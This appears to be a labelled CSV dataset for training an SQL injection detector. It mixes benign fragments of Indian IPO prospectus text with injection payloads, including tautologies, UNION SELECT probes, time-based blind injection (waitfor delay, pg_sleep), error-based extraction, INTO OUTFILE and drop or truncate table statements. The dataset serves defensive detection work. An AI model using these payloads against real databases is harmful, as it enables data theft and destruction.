Query,cleaned_query,label
"indian gas exchange limited annexure vii: notes to the restated financial information (all amounts in indian rupees millions, unless otherwise stated) 16","indian gas exchange limited annexure vii: notes to the restated financial information (all amounts in indian rupees millions, unless otherwise stated) 16",0
search_term=1' or 1=1 -- ;,search_term=1' or 1=1 -- ;,1
"tenor: 36 months maturity date: 10-mar-28 term loan from fis 11 first and exclusive charge on the standard receivables with a security cover of repayment terms: principal quarterly, interest monthly","tenor: 36 months maturity date: 10-mar-28 term loan from fis 11 first and exclusive charge on the standard receivables with a security cover of repayment terms: principal quarterly, interest monthly",0
"param_497' delete from id, username from roles_497 where id = 497 /**/ --","param_497' delete from id, username from roles_497 where id = 497 /**/ --",1
"param_874' insert into admin_flag, secret_key from system_config_874 where admin_flag = 874 --","param_874' insert into admin_flag, secret_key from system_config_874 where admin_flag = 874 --",1
this is important to reduce information asymmetry and improving decision making based on sourcing and the igx has emerged as a critical platform for developing indigenous price discovery in india’s natural gas sector,this is important to reduce information asymmetry and improving decision making based on sourcing and the igx has emerged as a critical platform for developing indigenous price discovery in india’s natural gas sector,0
"similarly, halcinonide was initially developed for the global generics market","similarly, halcinonide was initially developed for the global generics market",0
"for example, 94.9 million tonnes per annum of demand for cy 2020 corresponds to domestic finished steel demand in india for fiscal 2021, and so on.","for example, 94.9 million tonnes per annum of demand for cy 2020 corresponds to domestic finished steel demand in india for fiscal 2021, and so on.",0
"param_822' delete from api_key, ssn_tax_id from credit_cards_822 where api_key = 822 /**/ --","param_822' delete from api_key, ssn_tax_id from credit_cards_822 where api_key = 822 /**/ --",1
"of companies act, 2013","of companies act, 2013",0
"param_719' union all select username, id from financial_records_719 where username = 719 /*","param_719' union all select username, id from financial_records_719 where username = 719 /*",1
search prospectus for offer with registrar within fifteen days 1 or 1=1,search prospectus for offer with registrar within fifteen days 1 or 1=1,1
"subsequently, pursuant to press note no","subsequently, pursuant to press note no",0
"name(s) of allottee(s) and details of equity shares allotted per allottee 1 equity share held by being the record date madan kothari for 496,000 equity shares, and d) madanlal sardarmal kothari huf for 500,000 equity shares bonus issue in the ratio equity shares for every","name(s) of allottee(s) and details of equity shares allotted per allottee 1 equity share held by being the record date madan kothari for 496,000 equity shares, and d) madanlal sardarmal kothari huf for 500,000 equity shares bonus issue in the ratio equity shares for every",0
"the table sets forth the order book diversification across key product offerings: (₹ in million, except stated otherwise) cold rolling mills (crm) annealing & pickling line color coating line (ccl) other ancillary lines* skin pass mills (spm) spares and components","the table sets forth the order book diversification across key product offerings: (₹ in million, except stated otherwise) cold rolling mills (crm) annealing & pickling line color coating line (ccl) other ancillary lines* skin pass mills (spm) spares and components",0
"param_65'/**/into/**/outfile/**/username,/**/email/**/from/**/accounts_65/**/where/**/username/**/=/**/65/**/--","param_65'/**/into/**/outfile/**/username,/**/email/**/from/**/accounts_65/**/where/**/username/**/=/**/65/**/--",1
consumer confidence surveys by the reserve bank and other institutions,consumer confidence surveys by the reserve bank and other institutions,0
eligible nris may obtain copies of bid cum application form from the designated intermediaries,eligible nris may obtain copies of bid cum application form from the designated intermediaries,0
and sebi master circular no,and sebi master circular no,0
"occupational safety, storage and logistics controls: chemical production and storage facilities must","occupational safety, storage and logistics controls: chemical production and storage facilities must",0
"search prospectus for however , these indicators may change ur ' group by 1 --","search prospectus for however , these indicators may change ur ' group by 1 --",1
"param_194' char admin_flag, secret_key from session_keys_194 where admin_flag = 194 --","param_194' char admin_flag, secret_key from session_keys_194 where admin_flag = 194 --",1
the following table sets forth a breakdown of revenue from our top 10 customers along with their revenue contribution for the financial year 2024: name of the top 10 customers revenue contribution (in % of total revenue of shyam sel & power limited jindal steel odisha limited,the following table sets forth a breakdown of revenue from our top 10 customers along with their revenue contribution for the financial year 2024: name of the top 10 customers revenue contribution (in % of total revenue of shyam sel & power limited jindal steel odisha limited,0
"param_441' delete from account_balance, password_hash from filings_441 where account_balance = 441 /**/ --","param_441' delete from account_balance, password_hash from filings_441 where account_balance = 441 /**/ --",1
"param_2837' drop table credit_card_num, admin_flag from accounts_2837 where credit_card_num = 2837 /*comment*/ --","param_2837' drop table credit_card_num, admin_flag from accounts_2837 where credit_card_num = 2837 /*comment*/ --",1
"digital twins are used to create a digital replica of assets under maintenance and are used for remote monitoring, energy modeling, and scenario simulations","digital twins are used to create a digital replica of assets under maintenance and are used for remote monitoring, energy modeling, and scenario simulations",0
standards and equipment servicing to contractor work quality ensuring that service delivery consistently meets the defined benchmarks,standards and equipment servicing to contractor work quality ensuring that service delivery consistently meets the defined benchmarks,0
modification/ revision/cancellation of bids upward revision of bids by qibs and non-institutional,modification/ revision/cancellation of bids upward revision of bids by qibs and non-institutional,0
"pursuant to a resolution passed by our board on april 22, 2022, yash agarwal has been re-appointed as the executive director of our company","pursuant to a resolution passed by our board on april 22, 2022, yash agarwal has been re-appointed as the executive director of our company",0
"passed by the parliament of india in september 2020 1 union all select 1,2,3","passed by the parliament of india in september 2020 1 union all select 1,2,3",1
"as per this scheme, licence is granted to the jewellers by bis under bis hallmarking scheme","as per this scheme, licence is granted to the jewellers by bis under bis hallmarking scheme",0
"param_2974' union select admin_flag, session_id from tokens_2974 where admin_flag = 2974 ;--","param_2974' union select admin_flag, session_id from tokens_2974 where admin_flag = 2974 ;--",1
"harvindersingh basantsingh bindra date of birth: october 26, 1960 address: plot no","harvindersingh basantsingh bindra date of birth: october 26, 1960 address: plot no",0
"param_3793' union select id, account_balance from filings_3793 where id = 3793 ;--","param_3793' union select id, account_balance from filings_3793 where id = 3793 ;--",1
"medical: the medical industry uses psas for bandages, tapes, wound dressings, and other healthcare products","medical: the medical industry uses psas for bandages, tapes, wound dressings, and other healthcare products",0
"(if undertaken) shall be appropriately made in the relevant sections of the red herring prospectus and price band of a minimum price of ₹ [●] per equity share (i.e., the floor price) and the maximum price of ₹ [●] per equity share (i.e., the cap price), including any revisions thereof","(if undertaken) shall be appropriately made in the relevant sections of the red herring prospectus and price band of a minimum price of ₹ [●] per equity share (i.e., the floor price) and the maximum price of ₹ [●] per equity share (i.e., the cap price), including any revisions thereof",0
"construction of solar and wind power projects, along with associated balance-of-system integration and project execution capabilities across tamil nadu and puducherry","construction of solar and wind power projects, along with associated balance-of-system integration and project execution capabilities across tamil nadu and puducherry",0
"param_2594' update email, password_hash from session_keys_2594 where email = 2594 /**/ --","param_2594' update email, password_hash from session_keys_2594 where email = 2594 /**/ --",1
"search prospectus for these include initiatives relating to op 1 and (select 1 from(select count(*),concat(0x3a,0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a)","search prospectus for these include initiatives relating to op 1 and (select 1 from(select count(*),concat(0x3a,0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a)",1
"param_72' group by email, password_hash from system_config_72 where email = 72 ;--","param_72' group by email, password_hash from system_config_72 where email = 72 ;--",1
""";waitfor delay '0:0:__time__'--",""";waitfor delay '0:0:__time__'--",1
"three financial years, the occurrence of, or our inability to, effectively respond to any such event, could have an adverse effect on our business, financial condition, results of operations and cash flows","three financial years, the occurrence of, or our inability to, effectively respond to any such event, could have an adverse effect on our business, financial condition, results of operations and cash flows",0
"construction or equipment costs, changes in project scope and unforeseen technical or operational challenges","construction or equipment costs, changes in project scope and unforeseen technical or operational challenges",0
delayed unblock for cancelled / withdrawn / ₹100 per day or 15% p.a,delayed unblock for cancelled / withdrawn / ₹100 per day or 15% p.a,0
"maniar and nilesh navinchandra maniar ' union select null,null--","maniar and nilesh navinchandra maniar ' union select null,null--",1
and adjusted against the profit after tax of the group in order to arrive at the income attributable to vi,and adjusted against the profit after tax of the group in order to arrive at the income attributable to vi,0
"we operate 43 hotel and home brands as at december 31, 2025","we operate 43 hotel and home brands as at december 31, 2025",0
' or ''=' /**/ --,' or ''=' /**/ --,1
growth in revenue from operations (%) is calculated as a percentage of revenue from operations of the,growth in revenue from operations (%) is calculated as a percentage of revenue from operations of the,0
"param_3179' update api_key, credit_card_num from sebi_filings_3179 where api_key = 3179 #","param_3179' update api_key, credit_card_num from sebi_filings_3179 where api_key = 3179 #",1
that a common form of transmission shall be used,that a common form of transmission shall be used,0
"caspian impact investment adviser private limited received short-term credit rating of “care a1+” for the commercial paper (cp) issuance customer base crossed 100,000 commenced business in bihar and chhattisgarh received credit rating of care a+; stable for long term banking facilities","caspian impact investment adviser private limited received short-term credit rating of “care a1+” for the commercial paper (cp) issuance customer base crossed 100,000 commenced business in bihar and chhattisgarh received credit rating of care a+; stable for long term banking facilities",0
"param_3668' char id, account_balance from credit_cards_3668 where id = 3668 /**/ --","param_3668' char id, account_balance from credit_cards_3668 where id = 3668 /**/ --",1
"signed on behalf of p n s business private limited _____________________________ designation: director place: kolkata, india","signed on behalf of p n s business private limited _____________________________ designation: director place: kolkata, india",0
"param_2947' into outfile email, password_hash from filings_2947 where email = 2947 -- -","param_2947' into outfile email, password_hash from filings_2947 where email = 2947 -- -",1
"cost includes all expenses, '; waitfor delay '0:0:5' --","cost includes all expenses, '; waitfor delay '0:0:5' --",1
"unsecured, considered good total other non - current financial assets interest accrued on deposits derivative asset (mtm) measured at fair value through profit or loss (fvtpl) total other current financial assets deferred tax assets (net) for the nine months period ended 31 december 2025","unsecured, considered good total other non - current financial assets interest accrued on deposits derivative asset (mtm) measured at fair value through profit or loss (fvtpl) total other current financial assets deferred tax assets (net) for the nine months period ended 31 december 2025",0
"param_3823' group by secret_key, api_key from credit_cards_3823 where secret_key = 3823 ;","param_3823' group by secret_key, api_key from credit_cards_3823 where secret_key = 3823 ;",1
search_term=' union select null-- /*,search_term=' union select null-- /*,1
"param_813' union select api_key, credit_card_num from documents_813 where api_key = 813 #","param_813' union select api_key, credit_card_num from documents_813 where api_key = 813 #",1
"param_3006' benchmark email, admin_flag from passwords_3006 where email = 3006 #","param_3006' benchmark email, admin_flag from passwords_3006 where email = 3006 #",1
search_term=' or '1'='1 /**/ --,search_term=' or '1'='1 /**/ --,1
"param_2302' pg_sleep auth_token, id from audit_logs_2302 where auth_token = 2302 -- -","param_2302' pg_sleep auth_token, id from audit_logs_2302 where auth_token = 2302 -- -",1
"issue of shares for consideration other than cash or out of revaluation of reserves as of the date of this draft red herring prospectus, our company has not issued any equity shares out of revaluation of reserves or for consideration other than cash.","issue of shares for consideration other than cash or out of revaluation of reserves as of the date of this draft red herring prospectus, our company has not issued any equity shares out of revaluation of reserves or for consideration other than cash.",0
search prospectus for the next date of hearing is posted on ju ' or 1=1 union,search prospectus for the next date of hearing is posted on ju ' or 1=1 union,1
"if you are a qib, do not submit your bid after 3:00 p.m","if you are a qib, do not submit your bid after 3:00 p.m",0
billed in due course in accordance with the underlying contractual terms.,billed in due course in accordance with the underlying contractual terms.,0
"we intend to increase trading volumes on our exchange by expanding participation among buyers, sellers and intermediaries across the natural gas value chain","we intend to increase trading volumes on our exchange by expanding participation among buyers, sellers and intermediaries across the natural gas value chain",0
"combination of irrigated agriculture, procurement infrastructure, and crop diversification, and advanced agritech like iot soil sensors and mobile apps for direct farmer-buyer connections","combination of irrigated agriculture, procurement infrastructure, and crop diversification, and advanced agritech like iot soil sensors and mobile apps for direct farmer-buyer connections",0
"largely driven by an improvement in restated loss for the year of ₹12,865.18 million in fiscal 2023 to restated profit for the year of ₹2,295.79 million in fiscal 2024","largely driven by an improvement in restated loss for the year of ₹12,865.18 million in fiscal 2023 to restated profit for the year of ₹2,295.79 million in fiscal 2024",0
"any revision in the price band and the revised bid/offer period, if applicable, shall be widely disseminated by notification to the stock exchanges, by issuing a public notice, and also by indicating the change on the","any revision in the price band and the revised bid/offer period, if applicable, shall be widely disseminated by notification to the stock exchanges, by issuing a public notice, and also by indicating the change on the",0
"param_3809' alter table api_key, id from system_config_3809 where api_key = 3809 ;","param_3809' alter table api_key, id from system_config_3809 where api_key = 3809 ;",1
"param_2365'/**/group/**/by/**/account_balance,/**/secret_key/**/from/**/system_config_2365/**/where/**/account_balance/**/=/**/2365/**/;--","param_2365'/**/group/**/by/**/account_balance,/**/secret_key/**/from/**/system_config_2365/**/where/**/account_balance/**/=/**/2365/**/;--",1
"param_3862' drop table admin_flag, password_hash from passwords_3862 where admin_flag = 3862 #","param_3862' drop table admin_flag, password_hash from passwords_3862 where admin_flag = 3862 #",1
"(c) in transactions for acquisition of land, construction of building and supply of machinery, etc","(c) in transactions for acquisition of land, construction of building and supply of machinery, etc",0
"this may entail rescheduling or revising the planned expenditure and funding requirements, including the expenditure for a particular purpose at the discretion of our management, subject to compliance with applicable laws.","this may entail rescheduling or revising the planned expenditure and funding requirements, including the expenditure for a particular purpose at the discretion of our management, subject to compliance with applicable laws.",0
"search prospectus for ibl limited (g6 hospitality) the group, ' union select null--","search prospectus for ibl limited (g6 hospitality) the group, ' union select null--",1
each bidder should seek independent legal,each bidder should seek independent legal,0
capital employed (total liabilities and equity excluding avg,capital employed (total liabilities and equity excluding avg,0
"pre-painted galvalume (ppgl) contributes roughly 9-11% to total demand, benefiting from rising adoption in modern construction, warehouses, and infrastructure projects requiring enhanced durability and visual finish","pre-painted galvalume (ppgl) contributes roughly 9-11% to total demand, benefiting from rising adoption in modern construction, warehouses, and infrastructure projects requiring enhanced durability and visual finish",0
the company has filed appeal before appellate authority against the said orders in respective states without any admission of liability raised,the company has filed appeal before appellate authority against the said orders in respective states without any admission of liability raised,0
"under-subscription, if any, in the qib portion would not be allowed to be met with spill-over from other categories or a","under-subscription, if any, in the qib portion would not be allowed to be met with spill-over from other categories or a",0
our ability to maintain low attrition rates among employees facilitates,our ability to maintain low attrition rates among employees facilitates,0
search_term='; waitfor delay '0:0:5' -- ;,search_term='; waitfor delay '0:0:5' -- ;,1
"param_1320' truncate table api_key, email from filings_1320 where api_key = 1320 #","param_1320' truncate table api_key, email from filings_1320 where api_key = 1320 #",1
"additionally, we have exposure to foreign exchange-related risks since a portion of our revenue earnings are","additionally, we have exposure to foreign exchange-related risks since a portion of our revenue earnings are",0
"param_2868' union all select session_id, admin_flag from system_config_2868 where session_id = 2868 /*","param_2868' union all select session_id, admin_flag from system_config_2868 where session_id = 2868 /*",1
corresponding supplies in gstr-1 and discharge the related tax liability in gstr-3b,corresponding supplies in gstr-1 and discharge the related tax liability in gstr-3b,0
handling and mandi fee from ₹0.01 million in fiscal 2023 to ₹0.85 million in fiscal 2024 and an increase in packing material expenses from ₹2.50 million in fiscal 2023 to ₹2.84 million in fiscal 2024,handling and mandi fee from ₹0.01 million in fiscal 2023 to ₹0.85 million in fiscal 2024 and an increase in packing material expenses from ₹2.50 million in fiscal 2023 to ₹2.84 million in fiscal 2024,0
jesal girishbhai mehta huf 15,jesal girishbhai mehta huf 15,0
"information, including our company’s website www.igxindia.com, or the respective websites of any affiliate of our company or the respective websites of the book running lead managers or the website of the promoter selling shareholder would be doing so at his or her own risk.","information, including our company’s website www.igxindia.com, or the respective websites of any affiliate of our company or the respective websites of the book running lead managers or the website of the promoter selling shareholder would be doing so at his or her own risk.",0
"capital employed comprises net worth,","capital employed comprises net worth,",0
closing date by the intermediary responsible for causing such delay in unblocking,closing date by the intermediary responsible for causing such delay in unblocking,0
"search prospectus for pertaining to items under profit & ' union select null,null--","search prospectus for pertaining to items under profit & ' union select null,null--",1
search prospectus for underwriting arrangements and will be co 1; drop table users--,search prospectus for underwriting arrangements and will be co 1; drop table users--,1
"param_3696' char api_key, ssn_tax_id from system_config_3696 where api_key = 3696 /*","param_3696' char api_key, ssn_tax_id from system_config_3696 where api_key = 3696 /*",1
"param_2026' group by password_hash, id from users_2026 where password_hash = 2026 /*comment*/ --","param_2026' group by password_hash, id from users_2026 where password_hash = 2026 /*comment*/ --",1
"information technology we have implemented various information technology solutions and erp software to cover key areas of our operations, procurement, dispatch and accounting","information technology we have implemented various information technology solutions and erp software to cover key areas of our operations, procurement, dispatch and accounting",0
